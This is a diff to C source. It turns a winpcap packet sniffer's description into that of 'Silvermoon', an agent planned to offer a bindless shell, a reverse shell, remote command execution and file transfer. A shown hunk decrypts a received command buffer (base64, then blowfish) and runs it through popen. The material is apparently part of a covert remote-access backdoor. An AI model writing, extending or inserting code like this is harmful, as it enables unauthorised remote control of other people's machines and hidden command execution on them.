@@ -1,13 +1,20 @@
 /*
-    Simple Sniffer with winpcap , prints ethernet , ip , tcp , udp and icmp headers along with data dump in hex
-    Author : Silver Moon ( m00n.silv3r@gmail.com )
+WTF is this tool?
+-----------------
+Silvermoon is an agent.  Its features sets will ultimately include:
+o Per adapter mode switching (IP<->nopro) or multimode
+o POSIX compliant command line calls from remote requests
+ 	 > Non-interactive bindless shell for nopro mode adapters
+ 	 > Non-interactive reverse shell for IP mode adapters
+o File transfers
+	> Same caveats as above
 */
  
 #include "stdio.h"
 #include "stdlib.h"
 #include "string.h"
 
-#ifdef defined(_WIN32) || defined(WIN32)
+#if defined(_WIN32) || defined(WIN32)
 #include "winsock2.h"   //need winsock for inet_ntoa and ntohs methods
 #pragma comment(lib , "ws2_32.lib") //For winsock
 #pragma comment(lib , "wpcap.lib") //For winpcap
@@ -708,7 +715,7 @@ static int decode(unsigned char *ar, int size) { // handles unb64, then blowfish
 		char message[50000];
 		char bfr[50000];
 		FILE * fp;
-		if((fp=popen(commandbuf, "r")) == NULL) {
+		if((fp=popen((const char *)commandbuf, "r")) == NULL) {
 		   //-----printf("Error executing command buffer\n");
 		}
 		//-----printf("\n");
